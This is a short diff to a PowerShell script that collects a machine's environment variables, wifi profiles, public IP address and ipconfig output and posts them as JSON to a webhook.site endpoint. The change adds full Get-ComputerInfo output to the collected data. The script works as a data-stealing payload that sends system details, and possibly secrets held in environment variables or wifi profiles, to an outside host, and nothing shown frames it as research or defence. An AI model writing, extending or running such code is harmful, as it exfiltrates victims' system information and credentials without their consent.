@@ -17,7 +17,7 @@ $envVars = gci env: | ForEach-Object {
     $value = $_.Value
     "$key=$value"
 } | ConvertFrom-Csv -Delimiter '=' -Header Name, Value
-
+$extraInfo = (Get-ComputerInfo)
 $IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $IPconfig = (ipconfig /all)
 
@@ -26,6 +26,7 @@ $Body = @{
     'ipv4' = $IPV4
     'wifi_profiles' = $wifis
     'ipconfig' = $IPconfig
+    'extraInfo' = $extraInfo
     'env' = $envVars
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
